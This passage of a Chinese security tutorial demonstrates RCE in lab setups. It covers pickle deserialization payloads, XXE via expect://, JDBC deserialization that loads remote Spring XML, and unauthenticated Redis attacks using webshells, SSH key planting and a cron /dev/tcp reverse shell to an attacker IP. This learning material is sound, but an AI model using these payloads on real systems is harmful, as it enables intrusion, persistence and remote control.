此时给 fn 赋值，进入一个新的 new ctor 类中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169329974-52224a44-7e94-48c9-b0ef-8cc9e024d850.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169329974-52224a44-7e94-48c9-b0ef-8cc9e024d850.png)

而此时会生成一个临时文件，其中第九行就是我们要执行的代码

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169330058-81520b10-7e5b-487b-a880-59188b7423d2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169330058-81520b10-7e5b-487b-a880-59188b7423d2.png)

退出来后进入判断，如果 opts.client 存在且为真，则 returnedFn 被赋值为 fn 函数；否则，它被赋值为一个接受 data 参数的匿名函数，而这个 annoymous 函数就是我们刚刚存在恶意 payload 的函数

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169330390-6c0a4683-cad9-41e5-846c-097df72f6c7e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169330390-6c0a4683-cad9-41e5-846c-097df72f6c7e.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169330920-2c37677e-03f0-4ef3-9a2c-936a2b9c1067.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169330920-2c37677e-03f0-4ef3-9a2c-936a2b9c1067.png)

最后进入 apply 执行

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169331037-d99ca7da-b32c-4922-9ee1-d67970b17c2f.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169331037-d99ca7da-b32c-4922-9ee1-d67970b17c2f.png)

成功执行我们的命令

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169331332-4c537656-709a-4932-bb35-f5fd2b7579cd.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169331332-4c537656-709a-4932-bb35-f5fd2b7579cd.png)

**4.7 (Python) 反序列化导致 RCE**
---------------------------

正常来说反序列化导致 RCE 应该放在 3.6 的，但 python 独特的语言设计导致它不用像常规的反序列化一样找利用链，所以这边单独讲解下。

Python 中反序列化用的是 pickle 模块

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169331391-7e406820-5e49-4fad-a19f-8fd2d418189b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169331391-7e406820-5e49-4fad-a19f-8fd2d418189b.png)

一个很简单的例子，使用这段代码生成 payload

import pickleclass rcetest(): def **reduce**(self): return (**import**('os').system, ("whoami",))rce = rcetest()print(pickle.dumps(rce))[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169331693-33782fac-ccc6-45a4-842e-306e856c68e1.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169331693-33782fac-ccc6-45a4-842e-306e856c68e1.png)

pickle 序列化默认是 3 号协议，但可读性没有 0 号强

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169331957-505ee97b-5a7a-4c74-9579-fe56f0d8f005.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169331957-505ee97b-5a7a-4c74-9579-fe56f0d8f005.png)

先看下序列化的方式，源码下载

[https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz](https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz)

对于生成的 payload，在 pickle.py 和 pickletools.py 中有详细解释

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169332462-60a010bd-e9f5-45af-be9e-29f816126b1d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169332462-60a010bd-e9f5-45af-be9e-29f816126b1d.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169332750-b504ddd5-c70a-4a5f-967d-97dcedf69f12.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169332750-b504ddd5-c70a-4a5f-967d-97dcedf69f12.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169332982-7de58048-7a32-4ddd-81fe-29387315be8d.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169332982-7de58048-7a32-4ddd-81fe-29387315be8d.png)

而本章主要还是看反序列化

用 pickle.loads 进行反序列化，可以看到即使没有 **reduce** 依旧可以成功 RCE

import pickleclass rcetest(): def **init**(self): self.test = testrcetest = pickle.loads(b'\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.')

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169333123-7c56a8ec-fe32-46b9-815e-3c1dc14d2f11.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169333123-7c56a8ec-fe32-46b9-815e-3c1dc14d2f11.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169333297-2dab5258-20c0-453a-adb3-e610876af086.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169333297-2dab5258-20c0-453a-adb3-e610876af086.png)

读取源码

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169333770-65938a1e-9def-4a1a-a8cc-50dc98683e40.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169333770-65938a1e-9def-4a1a-a8cc-50dc98683e40.png)

进入定义的 load 函数中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169334339-dbaec09d-2018-4c30-b09e-64e0e5c7bbf3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169334339-dbaec09d-2018-4c30-b09e-64e0e5c7bbf3.png)

其中 opcode 就是刚刚看到的，根据 opcode 来进行操作

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169334506-0e02b740-201c-4299-977c-8797f8f29d04.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169334506-0e02b740-201c-4299-977c-8797f8f29d04.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169334837-9bc4d0ef-2f65-4d2e-a59c-6afe4f9c6162.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169334837-9bc4d0ef-2f65-4d2e-a59c-6afe4f9c6162.png)

Reduce 使用的是 load_reduce，跟进该函数

Load_reduce 从堆栈中弹出一个可调用对象和一个参数元组，然后调用该可调用对象，并将结果压入堆栈中

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169334964-86585c12-e792-4f37-8144-c77c038b171b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169334964-86585c12-e792-4f37-8144-c77c038b171b.png)

跟进逻辑后定位参数 PyEval_CallObjectWithKeywords，根据参数 args 是否为 NULL，选择使用 _PyObject_FastCallDict 函数（如果没有位置参数）或 PyObject_Call 函数（如果有位置参数）来调用可调用对象，并返回调用结果。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169335066-56dd5ee1-3f83-4193-b425-4813e2cd3b2b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169335066-56dd5ee1-3f83-4193-b425-4813e2cd3b2b.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169336509-7131456b-5460-466d-8625-6b444d55c73e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169336509-7131456b-5460-466d-8625-6b444d55c73e.png)

**4.8 (XML) XXE 注入导致 RCE**
--------------------------

XXE（XML 外部实体注入）漏洞，可以使攻击者能够干扰 Web 应用程序中 XML 数据的处理。利用此漏洞后，XXE 可允许攻击者访问敏感数据、执行远程代码或干扰 Web 应用程序中 XML 数据的处理。

先用 php 进行简单的案例示范

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169336483-3f46cbe8-c120-4f48-92af-878ca34ba456.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169336483-3f46cbe8-c120-4f48-92af-878ca34ba456.png)

可以看到访问成功的输出 1.txt 文件

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169336768-cf027f01-0088-4cc4-a671-db518f136fe8.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169336768-cf027f01-0088-4cc4-a671-db518f136fe8.png)

利用 expect 协议可以成功打 rce，但因为 windows 不好安装扩展所以改用 centos 做测试

以下是环境配置教程

安装 EPEL 仓库

sudo yum install epel-release

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169336769-f3602fa3-7503-4b8a-8203-81e9cff90ca2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169336769-f3602fa3-7503-4b8a-8203-81e9cff90ca2.png)

使用以下命令安装 php 开发工具和 expect

sudo yum install php-devel expect

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169336797-90bf4ae1-d9a4-4fea-840e-55274d136bf3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169336797-90bf4ae1-d9a4-4fea-840e-55274d136bf3.png)

sudo yum install tcl-devel

sudo yum install expect-devel

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337171-b04b2327-5007-4fcd-b935-e71e4b8692f3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337171-b04b2327-5007-4fcd-b935-e71e4b8692f3.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337328-e1b43b19-398a-42e3-ae4e-a2f47a9646ba.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337328-e1b43b19-398a-42e3-ae4e-a2f47a9646ba.png)

然后安装 pecl

sudo yum install php-pear

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337527-15afe981-b7b1-4e47-9f6e-d300f91e8ef7.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337527-15afe981-b7b1-4e47-9f6e-d300f91e8ef7.png)

最后使用 pecl 进行安装 expect

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337614-2fed3fa4-40e0-424f-81e8-37d9486a59c2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337614-2fed3fa4-40e0-424f-81e8-37d9486a59c2.png)

出现下面的消息说明安装成功

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337738-b76732d2-5fba-41dc-924b-435b9cf8e9ae.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337738-b76732d2-5fba-41dc-924b-435b9cf8e9ae.png)

然后开始进行配置

Vim /etc/php.ini

加一行

Extension=expect.so

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337838-8695bd13-d4e4-41c7-8634-93bf0e0379b5.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337838-8695bd13-d4e4-41c7-8634-93bf0e0379b5.png)

然后进行 RCE 复现

<?xml version="1.0"?>

<!DOCTYPE ANY [

<!ENTITY xxe SYSTEM "expect://id">]>

<x>&xxe;</x>

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337995-5c3de4d0-9f9c-481a-b307-c5612a4b48ad.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169337995-5c3de4d0-9f9c-481a-b307-c5612a4b48ad.png)

那么为何能执行命令呢，我们下载下来源码进行分析

[https://pecl.php.net/get/expect-0.4.0.tgz](https://pecl.php.net/get/expect-0.4.0.tgz)

在 expect_fopen_wrapper.c 文件中

35 行开始，首先检查命令字符串是否以 "expect://" 开头，如果是，则移除这个前缀，然后使用 exp_popen 函数尝试启动命令指定的外部进程

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169338310-6478662a-f437-4e01-aba2-745fc401d416.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169338310-6478662a-f437-4e01-aba2-745fc401d416.png)

而在 expect 库中

[https://core.tcl-lang.org/expect/index](https://core.tcl-lang.org/expect/index)

exp_clib.c 文件中定义了 exp_popen

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169338311-df3a5393-9847-40f8-b50b-00549e985944.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169338311-df3a5393-9847-40f8-b50b-00549e985944.png)

跟进 exp_spawnl，初始化后使用 malloc 为参数组”argv” 分配内存，然后调用 exp_spawnv

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169338507-7f585acd-4e32-4632-9b50-2ae0a9ccff56.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169338507-7f585acd-4e32-4632-9b50-2ae0a9ccff56.png)

继续跟进

file 是要执行的程序的路径，argv 是传递给该程序的参数列表，以 NULL 终止。然后初始化伪终端（pty）

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169338570-bfd2eef4-f27c-4f5a-97d4-9f0970f2a588.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169338570-bfd2eef4-f27c-4f5a-97d4-9f0970f2a588.png)

往下走，发现在 1909 中使用 fork 创建了子进程

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169338828-b8bc9559-09d0-4f02-ba19-7b3f6ecc1545.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169338828-b8bc9559-09d0-4f02-ba19-7b3f6ecc1545.png)

那么最终执行点在哪呢？在 2217 中使用 execvp 执行命令，其中 file 与 argv 都是我们传的参数，至此流程结束

**4.9 (JAVA) JDBC 反序列化导致 RCE**
------------------------------

JDBC（Java Database Connectivity）反序列化漏洞是指在 Java 应用程序中使用 JDBC 时，由于未正确验证或过滤用户输入的数据，导致攻击者可以通过构造恶意的序列化对象，实现远程代码执行的漏洞。

### **4.9.1 Mysql JDBC**

mysql 中提供了 queryInterceptors，可以在 SQL 查询前后做一些预处理。而 ServerStatusDiffInterceptor 是 queryInterceptors 的一个实现。其 preProcess 预处理时会执行 Show SESSION STATUS 语句并调用 Util.resultSetToMap 将执行结果转换为 Map。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339019-e86cd5b1-0f25-4795-b444-c02d8750a371.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339019-e86cd5b1-0f25-4795-b444-c02d8750a371.png)

resultSetToMap 中调用 ResultSet#getObject 获取对象闭并 put 到 mappedValues 中。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339188-543f9baf-91a6-4ff0-a35b-efe8efc5f124.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339188-543f9baf-91a6-4ff0-a35b-efe8efc5f124.png)

ResultSet#getObject 中存储的是 Blob 类型且 AutoDeserialize 属性为 true，则会获取对应列存储的内容并调用 readObject 触发原生 JAVA 反序列化漏洞。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339339-98e68a47-f828-4d76-a8fd-e3c361d1e905.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339339-98e68a47-f828-4d76-a8fd-e3c361d1e905.png)

而在设置 mysql jdbc 连接字符串时，可以通过如下方式设置拦截器并且设置 autoDeserialize 的属性。

queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true

因此只要能控制 mysql 连接字符串，可以让目标在连接我们控制的恶意 mysql 服务器并执行 SHOW SESSION STATUS 语句时返回构造好的序列化对象即可触发反序列化漏洞。

漏洞复现

首先需要构造一个恶意的 mysql 服务端，这里选用 MySQL_Fake_Server 来实现。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339412-3f28b518-9e7e-4a3a-bf8d-50f9fbdf7ab2.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339412-3f28b518-9e7e-4a3a-bf8d-50f9fbdf7ab2.png)

客户端通过控制 mysql jdbcurl 访问恶意服务端触发 RCE。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339462-6dedba99-3cae-4235-b0c2-6eb14ec9b383.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339462-6dedba99-3cae-4235-b0c2-6eb14ec9b383.png)

### **4.9.2 Postgresql JDBC**

SocketFactoryFactory 是 PostgreSQL JDBC 驱动程序中的一个重要组件，用于管理和提供适当的 Socket 工厂实例，以便应用程序能够与 PostgreSQL 数据库进行有效的通信。

getSocketFactory 方法中，会从 Properties 中获取 socketFactoryClassName 和 socketFactoryArg，并调用 ObjectFactory#instantiate 方法。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339699-f8a5d7c0-c3ba-4ea7-b06c-c6e887bd26c3.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339699-f8a5d7c0-c3ba-4ea7-b06c-c6e887bd26c3.png)

在 ObjectFactory#instantiate 中根据传入的 socketFactoryClassName 创建 class 并获取 socketFactoryArg 为参数创建一个对象。这里并没有对 class 名称做限制，因此可以调用任意类的只有一个 string 类型的构造方法。

很容易想到 org.springframework.context.support.ClassPathXmlApplicationContext 的构造方法可以加载远程 XML 实现 RCE。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339812-00da1a28-a44f-4208-8850-33b26d652bcc.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339812-00da1a28-a44f-4208-8850-33b26d652bcc.png)

所以只要能控制 properties 中属性即可实现 RCE，在 PostgreSQL 中也可以通过控制 jdbc 连接字符串来实现属性的赋值，因此可以如下方式控制属性实现 rce。

socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=[http://192.168.93.111:8080/bean.xml](http://192.168.93.111:8080/bean.xml)

漏洞复现

首先构造漏洞利用的 xml 文件放到服务器中并开启 http 服务。

<beans xmlns="[http://www.springframework.org/schema/beans](http://www.springframework.org/schema/beans)"

xmlns:xsi="[http://www.w3.org/2001/XMLSchema-instance](http://www.w3.org/2001/XMLSchema-instance)"

xmlns:p="[http://www.springframework.org/schema/p](http://www.springframework.org/schema/p)"

xsi:schemaLocation="[http://www.springframework.org/schema/beans](http://www.springframework.org/schema/beans)

[http://www.springframework.org/schema/beans/spring-beans.xsd"%3E](http://www.springframework.org/schema/beans/spring-beans.xsd)

<bean init-method="start"> <constructor-arg> <list> <value>cmd</value> <value>/c</value> <value>calc.exe</value> </list> </constructor-arg> </bean>

</beans>

通过控制 jdbc 连接字符串加载远程 XML 实现 RCE。

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339987-8db81736-6e47-4eec-b921-853f7acff5fb.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169339987-8db81736-6e47-4eec-b921-853f7acff5fb.png)

**5 特殊情况下的 RCE**
----------------

本模块为实战渗透中，部分服务器，程序默认配置不当或软件本身设计造成 RCE

**5.1 redis 未授权 rce**
---------------------

Redis 是一个开源的（BSD 许可）内存中数据结构存储系统，它可以用作数据库、缓存和消息代理。Redis 支持多种类型的数据结构，如字符串（strings）、哈希表（hashes）、列表（lists）、集合（sets）、有序集合（sorted sets）以及范围查询、位图、超日志和地理空间索引半径查询。由于其极高的性能，Redis 常被用于需要快速响应的场景，比如网站的会话缓存（session caching）、实时应用程序、排行榜、发布 / 订阅系统等。

官方安装教程

[https://redis.com.cn/redis-installation.html](https://redis.com.cn/redis-installation.html)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340272-60fd184c-6399-4568-bdf9-76654f029993.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340272-60fd184c-6399-4568-bdf9-76654f029993.png)

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340263-f87b214a-459c-4db6-b13f-db262072d466.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340263-f87b214a-459c-4db6-b13f-db262072d466.png)

Redis rce 有几个前置条件

1 无密码或弱密码

2 可以进行连接

3 连接后有足够的权限执行我们所需的命令

### **5.1.1 redisRCE (WINDOWS)**

在 windows 下有两种方式 rce

1 在知道网站绝对路径的情况下写入 webshell

2 写入自启动，直接进行反弹 shell

先复现第一种

Redis-server.exe redis.windows.conf 启动 redis 服务

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340374-6da637d5-a598-44d4-951c-82b394d877ed.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340374-6da637d5-a598-44d4-951c-82b394d877ed.png)

Redis-cli.exe -h 目标 ip -p 目标端口

1 config set dir 目标站点路径

2 config set dbfilename webshell 文件名

3 set test “恶意代码内容”

4 save

可以发现成功在目标的 web 目录下写入了 webshell

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340454-fa0d0c60-644d-42da-a7b7-f36d88418292.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340454-fa0d0c60-644d-42da-a7b7-f36d88418292.png)

第二种直接进行反弹 shell

1 Config set dir 目标自启动文件夹

(ps: 自启动文件夹大部分是以下路径

"C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/")

2 Config set dbfilename 文件名

3 Set test1 “\r\n\r\n 恶意代码 \ r\n\r\n” (ps：可以看出 redis 在写入目标文件时会有些许乱码，所以需要换行符将我们需要执行的代码单独写一行)

4 Save

然后当目标主机重启后即可执行. bat 文件（这里为了演示直接双击了. bat 文件）

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340764-77f1443c-588c-4546-825a-fe84e31458b1.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340764-77f1443c-588c-4546-825a-fe84e31458b1.png)

### **5.1.2 redisRCE(LINUX)**

安装过程

1 wget [http://download.redis.io/releases/redis-3.2.9.tar.gz2tar](http://download.redis.io/releases/redis-3.2.9.tar.gz2tar) -zxvf redis-3.2.9.tar.gz3 mv redis-3.2.9 /usr/local/redis4 cd /usr/local/redis

5 make MALLOC=libc

6 make & make install

然后配置一下 redis.conf 文件

vim redis.conf

将 bind 127.0.0.1 注释掉

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340891-31b82c92-2f81-43df-8dc0-81adb420e606.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340891-31b82c92-2f81-43df-8dc0-81adb420e606.png)

然后将 protected-mode 设置为 no

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340892-b25869aa-dc1b-46ee-9c57-ab4cb624b373.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169340892-b25869aa-dc1b-46ee-9c57-ab4cb624b373.png)

如果跟我一样是 centos 的话，且想让内网其他主机也能访问到 redis 服务，需要输入以下两个命令配置防火墙

sudo firewall-cmd --zone=public --add-port=6379/tcp --permanent

sudo firewall-cmd --reload

输入 redis-server redis.conf 运行

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341041-a29b1e64-788e-4efa-b06a-5d5593a85101.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341041-a29b1e64-788e-4efa-b06a-5d5593a85101.png)

1 webshell 这种方式与 windows 一样，这里不做演示

2 写入 ssh 秘钥

Redis 服务 192.168.50.238 centos

攻击机 192.168.50.36 kali

攻击机生成 sshkey

Ssh-keygen -t rsa

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341061-2cd21982-c122-495c-967f-3614f367e830.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341061-2cd21982-c122-495c-967f-3614f367e830.png)

(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > test.txt 将公钥写入文件

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341250-f1ab52c9-9ce6-48d6-9461-c6e483db9e21.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341250-f1ab52c9-9ce6-48d6-9461-c6e483db9e21.png)

redis 服务机需要本地 ssh localhost 一下才能利用

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341541-c9cb9626-4033-477c-b1d2-a1f708a5424e.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341541-c9cb9626-4033-477c-b1d2-a1f708a5424e.png)

cat test.txt | redis-cli -h 192.168.50.238 -x set test 将公钥写入目标缓冲区

config set dir /root/.ssh 选择目标文件夹地址

config set dbfilename “authorized_keys” 目标文件名

keys *

get test 获取键值

save 保存

exit

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341539-7b69b702-5e00-4ef1-a3e1-904240e90581.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341539-7b69b702-5e00-4ef1-a3e1-904240e90581.png)

退出后即可使用 ssh 直接连接目标了

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341719-c5a25092-3baf-4298-af56-0484a2c53ba5.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341719-c5a25092-3baf-4298-af56-0484a2c53ba5.png)

3 定时任务

先是攻击机 kali 192.168.50.36 开启 nc 监听

nc -lvnp 7777

然后连接 redis 后依次输入以下命令

set test1 "\n\n_/1_ * /bin/bash -i>&/dev/tcp/192.168.50.36/7777 0>&1\n\n"

config set dir /var/spool/cron

config set dbfilename root

save

save 后即可成功 rce

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341818-d17236a3-0099-4d3e-a068-20656d127231.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341818-d17236a3-0099-4d3e-a068-20656d127231.png)

4 主从复制

主从复制需要重新配下环境，这里选用 docker

sudo systemctl start docker

Docker pull damonevking/redis5.0

docker run -p 6379:6379 -d damonevking/redis5.0 redis-server

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341996-e8e0bb7f-6b5d-4c45-afd1-30ba26760a66.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169341996-e8e0bb7f-6b5d-4c45-afd1-30ba26760a66.png)

利用过程

使用这位师傅的脚本

[https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)

输入以下命令获取压缩包

wget [https://codeload.github.com/n0b0dyCN/redis-rogue-server/zip/refs/heads/master](https://codeload.github.com/n0b0dyCN/redis-rogue-server/zip/refs/heads/master)

解压缩后执行下面命令

./redis-rogue-server.py --rhost redis 服务地址 --lhost 本机地址

[![](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169342140-b1b759fa-2435-428b-828b-26091923896b.png)](https://cdn.nlark.com/yuque/0/2024/png/34613151/1715169342140-b1b759fa-2435-428b-828b-26091923896b.png)

**后记及致谢：**
----------

说实话，22 年发表完 RCE 宝典第一版后，没想到有这么多师傅是愿意看的，本身只是本人的一个笔记，写的十分随心。而这篇文章，能帮到一些初学的小白，一些有基础的学生，真是让我感到意外之喜。初有写 RCE 宝典这个想法，是因为在学习过程中对于不同的 RCE 的复现，利用，分析需要一一对应着搜，我是一个很怕麻烦的人，于是便想将所有能实现 RCE 漏洞的方式整合到一起，以便以后进行查找。**第一版跟这版没有很强的相关性，所以对于没看过第一版直接看本文的是可行的。**

23 年疲于学业与大小琐事，没有在安全上花很大的心思，所以也没有写文的动力，公众号除了广告一年才写了 5 篇文章。而趁着今年较有闲时我决心复写本文，意在更全面，更细节。我希望这不仅仅是个人的笔记，而是在以后有跟我一样初入门的小白，可以不用费力去一个个查找文章。

我现在也仅仅只是一个正在学习的学生，没有太强的专业知识，没有过高的成就，所以在以后源源不断的学习下，RCE 宝典的知识及模块也会慢慢扩充。**在阅读本文时，如果你发现某个漏洞复现分析，或者对于某个漏洞很不理解，不是你的问题，是因为本人心余力绌，真正的专家和高手写的一定是深入浅出且通俗易懂的，所以如果有好的案例或者对本文的补充与修改，非常欢迎各位师傅联系我来提建议。**

非常感谢家人对我的支持，也非常感谢安全圈各位师傅在网上写的文章，无私分享的各种知识，这对本文有极大地推动。我本人才疏学浅，不太懂 JAVA 也不太懂 PWN，鉴于此，不敢随意提笔怕误人子弟，所以文中较难较复杂的 JAVA 知识点，如反序列化，JDBC，JNDI 等由**藏青**师傅代笔完成，缓冲区溢出 RCE 由**白袍**师傅代笔完成。而其他较为复杂的知识点和一些普通的 JAVA 知识点也是在每次写完后都请教 **wkong 丶**师傅和 **4ra1n** 师傅，非常感谢两位师傅的大力支持，在我写文时基本上是隔三差五被我骚扰一顿。很多当时问的问题，写完回头一看，发现跟傻子问的差不多，但两位师傅都非常的耐心的解答我的问题，真的让我感激不尽。

除此之外，还有那些在我编写本文时伸出援手的师傅们，包括**孙爱民**，**猫茜茜 ****。** 你们提供的各种帮助，都是我撰写这篇文章的不可或缺的一部分，在此对你们致以最深切的谢意！

文章内容如有任何错误或者对不上号的，可在评论区讨论，感谢各位大佬们的指点